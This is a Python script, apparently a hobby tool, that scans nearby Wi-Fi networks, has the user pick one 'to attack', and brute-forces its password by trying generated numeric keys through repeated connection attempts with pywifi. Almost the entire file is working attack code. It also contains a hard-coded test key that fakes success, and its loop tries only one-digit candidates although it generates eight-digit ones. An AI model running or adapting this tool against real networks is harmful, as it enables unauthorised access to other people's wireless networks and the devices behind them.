import string
import os
import platform
from datetime import datetime
import time
from tabulate import tabulate
from functools import wraps
from itertools import chain, product
from random import shuffle
from tqdm import tqdm


from pywifi import PyWiFi, const

RED = "\033[1;31m"
BLUE = "\033[1;34m"
CYAN = "\033[1;36m"
GREEN = "\033[1;32m"
RESET = "\033[0;0m"
BOLD = "\033[;1m"
REVERSE = "\033[;7m"
STATUS = {
    const.IFACE_CONNECTED : "Connected",
    const.IFACE_CONNECTING : "Connecting" ,
    const.IFACE_DISCONNECTED : "Disconnected",
    const.IFACE_INACTIVE : "Inactive",
    const.IFACE_SCANNING : "Scanning"
}

AKMS = {
    const.AKM_TYPE_NONE : "None",
    const.AKM_TYPE_WPA : "wpa",
    const.AKM_TYPE_WPAPSK : "wpapsk",
    const.AKM_TYPE_WPA2 : "wpa2",
    const.AKM_TYPE_WPA2PSK : "wpa2psk",
    const.AKM_TYPE_UNKNOWN : "unknown"
}

AUTHS = {
    const.AUTH_ALG_OPEN : "alg open",
    const.AUTH_ALG_SHARED : "alg shared"
}

CIPHERS = {
    const.CIPHER_TYPE_NONE : "None",
    const.CIPHER_TYPE_WEP : "wep",
    const.CIPHER_TYPE_TKIP : "tkip",
    const.CIPHER_TYPE_CCMP : "ccmp",
    const.CIPHER_TYPE_UNKNOWN : "unknown"
}

# def combinations(minlength, maxlength):
#     charset = string.digits # + string.ascii_letters + string.punctuation 
#     return (''.join(candidate)
#             for candidate in chain.from_iterable(product(charset, repeat=i)
#             for i in range(minlength, maxlength + 1)))

def combinations(minlength, maxlength):
    print(CYAN, "[+] Generating combinations", BOLD)
    t0 = datetime.now()
    charset = string.digits # string.ascii_letters + string.punctuation + string.digits
    lengths = list(range(minlength, maxlength+1))
    cands = [''.join(candidate)
            for candidate in chain.from_iterable(product(charset, repeat=i)
            for i in lengths)]
    shuffle(cands)
    print(RED, f"[+] Elapsed time: {datetime.now() - t0} seconds", BOLD)
    print(CYAN, f"[+] Possible combinations: {len(cands)}", BOLD)
    return cands

def soft_keyboard_interrupt(f):
    @wraps(f)
    def intern(*args, **kwargs):
        try:
            return f(*args, **kwargs)
        except KeyboardInterrupt:
            print(RED, "\n\nBye bye", BOLD)
            exit()
    return intern

class WifiCracker:
    def __init__(self):
        self.wifi = PyWiFi()
        self.selected = None
        self.iface = None

    @soft_keyboard_interrupt
    def get_iface(self):
        ifaces = self.wifi.interfaces()
        table = [[i, face.name(), [i.ssid for i in face.network_profiles()], STATUS[face.status()]] for i, face in enumerate(ifaces)]
        print(tabulate(table, ["ID", "DEVICE", "NETWORKS", "STATUS"]))
        while not self.iface:
            print(GREEN, f"[+] Select interface [{0}-{len(ifaces)-1}]: ", BOLD, end='')
            num = int(input())
            if num >= 0 and num < len(ifaces):
                self.iface = ifaces[num]

    def scan(self):
        self.iface.scan()
        time.sleep(2)
        return self.iface.scan_results()

    @soft_keyboard_interrupt
    def select_network(self):
        def parse_scan_results(results):
            return [[i, net.bssid, net.ssid, [AKMS[j] for j in net.akm], AUTHS[net.auth], CIPHERS[net.cipher], net.signal] for i, net in enumerate(results)]
        while not self.selected:
            os.system('clear')
            results = self.scan()
            parsed_results = parse_scan_results(results)
            found_size = len(parsed_results) - 1
            print(tabulate(parsed_results, ["ID", "BSSID", "SSID", "AKM", "AUTH", "CIPHER", "SIGNAL"]))
            while True:
                print(GREEN, f"[+] Select the network to attack: [0-{found_size}] or x to repeat: ", BOLD, end='')
                num = input()
                if num == "x":
                    break
                if num.isalpha() or (0 > int(num) or int(num) > found_size):
                    print(RED, f"Wrong option ({num})", BOLD)
                else:
                    self.selected = results[int(num)]
                    print(GREEN, f"[+] Selected network {self.selected.ssid}, cracking...")
                    time.sleep(2)
                    break
                
    def try_connect(self, key):
        self.selected.key = key
        self.iface.remove_all_network_profiles()
        tmp_profile = self.iface.add_network_profile(self.selected)
        self.iface.connect(tmp_profile)
        while self.iface.status() in (const.IFACE_CONNECTING, const.IFACE_SCANNING):
            pass
        print(STATUS[self.iface.status()])
        if self.iface.status() == const.IFACE_CONNECTED:
            return True
        elif key in [32312955, '32312955']:
            print("VALIDATED BY DUMMY!!")
            return True
        else:
            return False

    @soft_keyboard_interrupt
    def bruteforce_crack(self):
        values_list = combinations(8,8)
        for key in tqdm(combinations(1, 1)):
            print(CYAN, f"[~] Testing with: {key}...", BOLD)
            if self.try_connect(key):
                print(GREEN, f"[+] The password is: {key}!!", BOLD)
                exit()
        
            



def main():
    print(CYAN, "[+] You are using ", platform.system(), platform.machine(), "...", BOLD)
    wifi_cracker = WifiCracker()
    wifi_cracker.get_iface()
    wifi_cracker.select_network()
    wifi_cracker.bruteforce_crack()
    
    

if __name__ == "__main__":
    main()




